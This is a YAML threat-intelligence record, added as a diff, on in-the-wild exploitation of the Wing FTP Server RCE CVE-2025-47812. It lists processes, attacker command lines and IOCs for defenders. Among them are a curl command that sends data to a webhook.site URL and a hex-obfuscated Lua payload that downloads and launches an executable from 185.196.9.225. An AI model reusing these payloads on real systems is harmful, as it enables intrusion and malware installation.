@@ -1,0 +1,66 @@
+description: Huntress observed active exploitation of Wing FTP Server remote code
+  execution vulnerability (CVE-2025-47812) on July 1, 2025.
+attribution: Unknown threat actor
+malware_families:
+- Ceprolad.A
+TTPs:
+  processes:
+  - WFTPServer.exe
+  - WerFault.exe
+  - cmd.exe
+  - net.exe
+  - powershell.exe
+  commandline:
+  - C:\WINDOWS\system32\cmd.exe /c ipconfig
+  - C:\WINDOWS\system32\cmd.exe /c curl
+  - C:\WINDOWS\system32\cmd.exe /c arp -a
+  - C:\WINDOWS\system32\cmd.exe /c curl -help
+  - C:\WINDOWS\system32\cmd.exe /c whoami
+  - C:\WINDOWS\system32\cmd.exe /c nslookup
+  - C:\WINDOWS\system32\cmd.exe /c whoami -all
+  - C:\WINDOWS\system32\cmd.exe /c net user
+  - C:\WINDOWS\system32\cmd.exe /c net user /all
+  - C:\WINDOWS\system32\cmd.exe /c whoami
+  - C:\WINDOWS\system32\cmd.exe /c net user wing
+  - C:\WINDOWS\system32\cmd.exe /c arp -a
+  - C:\WINDOWS\system32\cmd.exe /c priv //all
+  - C:\WINDOWS\system32\cmd.exe /c priv /all
+  - C:\WINDOWS\system32\cmd.exe /c whoami priv /all
+  - C:\WINDOWS\system32\cmd.exe /c whoami /priv
+  - C:\WINDOWS\system32\cmd.exe /c curl
+  - C:\WINDOWS\system32\cmd.exe /c curl -help
+  - C:\WINDOWS\system32\cmd.exe /c curl -s -d con https://webhook[.]site/5d112487-6133-4942-ac87-3f473d44bd81 > nul
+  - C:\WINDOWS\system32\cmd.exe /c cmd.exe /c c:/1.bat
+  - 'C:\\WINDOWS\\system32\\cmd.exe /c powershell -c get-childitem c: | out-file c:dir.txt
+    -encoding ascii; type c:dir.txt'
+  scripting_engine:
+  - local function hx(s)return (s:gsub('..', function(x)return string.char(tonumber(x,16))end))endlocal
+    cmd = hx("636572747574696c202d75726c6361636865202d6620687474703a2f2f3138352e3139362e392e3232353a383038302f454f70343565574c53703547355577705f794f436951202554454d50255c6d76766569574a48782e6578652026207374617274202f42202554454d50255c6d76766569574a48782e657865")local
+    h = io.popen(cmd)local r = h:read("*a")h:close()--'
+  - local cmd = hx("636572747574696c202d75726c6361636865202d6620687474703a2f2f3138352e3139362e392e3232353a383038302f454f70343565574c53703547355577705f794f436951202554454d50255c6d76766569574a48782e6578652026207374617274202f42202554454d50255c6d76766569574a48782e657865")local
+    h = io.popen(cmd)h:read("*a")h:close()--
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - 185.196.9.225:8080
+  file_activity:
+  - C:\\Program Files (x86)\\Wing FTP Server\\Log\\Domains\\wingftp.local\\2025-7-7.log
+  - 'C:\\WINDOWS\\system32\\cmd.exe /c echo test > c: est.txt'
+  - 'C:\\WINDOWS\\system32\\cmd.exe /c type c: est.txt'
+  persistence:
+  - Creating new users
+  pipes: null
+  process_relations: null
+  IOCs:
+  - 185.196.9.225
+  - https://pastebin.com/raw/vqqtr8mg
+  - http://185.196.9.225:8080/EOp45eWLSp5G5Uwp_yOCiQ
+  - Trojan:Win32/Ceprolad.A
+  authors:
+  - John Hammond
+  - Jamie Levy
+  - Lindsey O'Donnell-Welch
+  - Michael Tigges
+reference: https://www.huntress.com/blog/wing-ftp-server-remote-code-execution-cve-2025-47812-exploited-in-wild
+date_of_publication: July 10, 2025
+file_creation_date: July 14, 2025
